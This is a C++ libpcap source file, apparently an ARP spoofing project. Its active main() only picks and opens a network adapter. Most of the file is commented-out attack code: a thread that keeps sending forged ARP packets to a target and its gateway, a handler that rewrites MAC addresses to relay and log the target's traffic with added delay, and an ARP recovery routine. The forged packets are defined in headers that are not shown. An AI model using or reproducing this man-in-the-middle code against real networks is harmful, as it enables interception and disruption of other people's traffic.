#include "headers/AdapterQuery.h"
#include "headers/net_structure.h"

#include <pthread.h>
#include <iostream>

using std::cin, std::cout;

int us;

void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);


int main() {
    string dev_name = list_dev_and_choose_dev();
    pcap_t *adapter = open_adapter(dev_name);
//    int choose;
//    scanf("%d",&us);
//
//    if (true) {
//        pthread_t tid;
//        pthread_create(&tid, nullptr, &arp_spoofing, nullptr);
//
//        //start the capture
//        pcap_loop(adapter, 0, packet_handler, NULL);
//
//        pcap_close(adapter);
//        getchar();
//    }
//    else if (choose==2)
//    {
//        arp_recover(nullptr);
//    }

    return 0;
}

/* Callback function invoked by libpcap for every incoming packet */
//void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data) {
//    struct tm ltime;
//    char timestr[16];
//    ethernet_header *eh;
//    ip_header *ih;
//
//    /*
//     * Unused variable
//     */
//    (void) (param);
//
//    eh = (ethernet_header *) pkt_data;
//
//    // Make latency
//    usleep(us);
//
//    if (eh->type == htons(0x0800))    // IPv4 is 0x0800
//    {
//        /* retireve the position of the ip header */
//        ih = (ip_header *) (pkt_data +
//                            sizeof(ethernet_header)); //length of ethernet heade
//        if (!memcmp((void *) &ih->daddr, dst_ip, 4)) {
//            printf("To Target:\t%d%d.%d.%d\t -> %d.%d.%d.%d\tlen:%d\n",
//                   ih->saddr.byte1,
//                   ih->saddr.byte2,
//                   ih->saddr.byte3,
//                   ih->saddr.byte4,
//
//                   ih->daddr.byte1,
//                   ih->daddr.byte2,
//                   ih->daddr.byte3,
//                   ih->daddr.byte4,
//
//                   header->len);
//            memcpy(eh->dst_mac, dst_mac, 6);
//            memcpy(eh->src_mac, src_mac, 6);
//            pcap_sendpacket(adapter,                                // Adapter
//                            (const u_char *) pkt_data,   // buffer with the deceive_dst_packet
//                            header->len                             // size
//            );
//
//        } else if (!memcmp((void *) &ih->saddr, dst_ip, 4)) {
//            printf("From Target:\t%d.%d.%d.%d\t -> %d.%d.%d.%d\tlen:%d\n",
//                   ih->saddr.byte1,
//                   ih->saddr.byte2,
//                   ih->saddr.byte3,
//                   ih->saddr.byte4,
//
//                   ih->daddr.byte1,
//                   ih->daddr.byte2,
//                   ih->daddr.byte3,
//                   ih->daddr.byte4,
//
//                   header->len);
//            memcpy(eh->dst_mac, gateway_mac, 6);
//            memcpy(eh->src_mac, src_mac, 6);
//            if (pcap_sendpacket(adapter,                                // Adapter
//                            (const u_char *) pkt_data,   // buffer with the deceive_dst_packet
//                            header->len                             // size
//            ) != 0)
//                fprintf(stderr, "\nError sending the Retrans_packet to : %s\n", pcap_geterr(adapter));
//        }
//    }
//}
//
//
//void *arp_spoofing(void *arg) {
//    while (true) {
//        // Send down the deceive_dst_packet
//        if (pcap_sendpacket(adapter,                                 // Adapter
//                            (const u_char *) &deceive_dst_packet,    // buffer with the deceive_dst_packet
//                            sizeof(deceive_dst_packet)               // size
//        ) != 0) {
//            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
//            return nullptr;
//        }
//        if (pcap_sendpacket(adapter,                                        // Adapter
//                            (const u_char *) &deceive_gateway_packet,       // buffer with the deceive_dst_packet
//                            sizeof(deceive_gateway_packet)                  // size
//        ) != 0) {
//            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
//            return nullptr;
//        }
//        sleep(1);
//    }
//}

//void *arp_recover(void *arg) {
//    while (true) {
//        // Send down the deceive_dst_packet
//        if (pcap_sendpacket(adapter,                                 // Adapter
//                            (const u_char *) &recover_dst_packet,    // buffer with the deceive_dst_packet
//                            sizeof(recover_dst_packet)               // size
//        ) != 0) {
//            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
//            return nullptr;
//        }
//        if (pcap_sendpacket(adapter,                                        // Adapter
//                            (const u_char *) &recover_gateway_packet,       // buffer with the deceive_dst_packet
//                            sizeof(recover_gateway_packet)                  // size
//        ) != 0) {
//            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
//            return nullptr;
//        }
//        sleep(1);
//    }
//}

